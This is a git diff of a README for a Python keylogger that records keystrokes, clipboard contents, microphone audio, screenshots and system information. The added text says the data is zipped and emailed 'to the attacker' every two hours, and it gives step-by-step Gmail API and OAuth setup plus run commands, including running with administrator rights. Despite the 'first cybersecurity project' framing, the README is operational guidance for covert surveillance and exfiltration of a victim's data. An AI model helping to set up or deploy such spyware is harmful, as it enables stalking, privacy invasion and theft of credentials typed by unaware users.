@@ -1,10 +1,10 @@
-# Advanced Keylogger & System Monitor
+# Advanced Keylogger
 
 ![Keylogger](overview.jpg)
 
 ## Overview
 Hi guys, this is my first cybersecurity project! (theoretically)
-This project is an advanced keylogger and system monitoring tool that captures keystrokes, clipboard data, microphone audio, screenshots, and system information. It is designed to run continuously, logging data and detecting changes in real-time.
+This project is an advanced keylogger and system monitoring tool that captures keystrokes, clipboard data, microphone audio, screenshots, and system information. It is designed to run continuously, logging data and detecting changes in real-time. After that, the data is organized into categorized folders and zipped automatically for efficiency and portability. Every 2 hours, the results will be sent via email to the attacker.
 
 ## Features
 ### 1. **Keylogger**
@@ -29,25 +29,69 @@ This project is an advanced keylogger and system monitoring tool that captures k
 - Lists running processes, excluding common system processes.
 - Updates every 1 hour.
 
-## Libraries Used
-- **pynput** (Keyboard event listening)
-- **pyperclip** (Clipboard monitoring)
-- **sounddevice** (Audio recording)
-- **Pillow** (Screenshot capture)
-- **wmi** (System information retrieval on Windows)
-- **socket & uuid** (Network and device identification)
-- **threading** (Running multiple monitoring tasks in parallel)
-- **time & datetime** (Task scheduling and timestamps)
+## Technology Used
+- **Python**: Main programming language.
+- **Gmail API**: Email automation and attachment delivery.
+- **Threading**: Concurrent background tasks.
+- **shutil / zipfile**: File system manipulation and compression.
+- **Pathlib & OS**: Directory handling.
+- **Base64 & EmailMessage**: Email encoding and MIME formatting.
+- **PyAudio, Pillow, etc.**: For microphone recording and screenshot capture.
 
 ## Setup & Execution
-1. Install dependencies:
-   ```sh
-   pip install -r requirements.txt
-   ```
-2. Run the script as administrator (if necessary for permissions):
-   ```sh
-   python keylogger.py
-   ```
+Follow the steps below to set up and run the Advanced Keylogger with Gmail integration:
+## 1. Install Python Dependencies
+Make sure you have Python 3 installed, then install the required packages:
+
+```sh
+pip install -r requirements.txt
+```
+
+## 2. Gmail API Setup (Google Cloud Console) 
+To enable Gmail automation for email sending:
+
+### Create a Project and Enable Gmail API 
+1. Go to the Google Cloud Console.
+2. Create a new project (e.g., `Keylogger Automation`).
+3. Navigate to **APIs & Services > Library**.
+4. Search for **Gmail API** and click **Enable**.
+
+### Configure OAuth Consent and Credentials 
+1. Go to **APIs & Services > Credentials**.
+2. Click **Create Credentials > OAuth client ID**.
+3. If prompted, first configure the **OAuth Consent Screen**:
+   * Choose **External** for user type.
+   * Fill in required details (App name, User support email, etc.).
+   * Save and continue until the end.
+4. Go back to **Credentials**, click **Create Credentials > OAuth client ID** again.
+5. Choose **Desktop App** as the application type and name it accordingly.
+6. After creation, click **Download JSON** and place the file in your project folder.
+7. In your `.env` file, add:
+
+```env
+CREDENTIAL_FILE=your_downloaded_json_file.json
+TOKEN_FILE=your_generated_token.json
+```
+
+### Add Test User (For OAuth in Development) 
+1. Go to **OAuth consent screen > Test Users**.
+2. Click **Add Users** and enter your Gmail address used for testing.
+
+## 3. Generate Gmail API Token 
+Once the JSON credentials are set:
+
+```sh
+python generate_token.py
+```
+
+If successful, a `token.json` file will be created in your project folder.
+
+## 4. Run the Keylogger 
+You might need administrator/root privileges for full access to system features (e.g., audio, clipboard, keylogging).
+
+```sh
+python keylogger.py
+```
 
 ## Notes
 - The script continuously runs in the background.
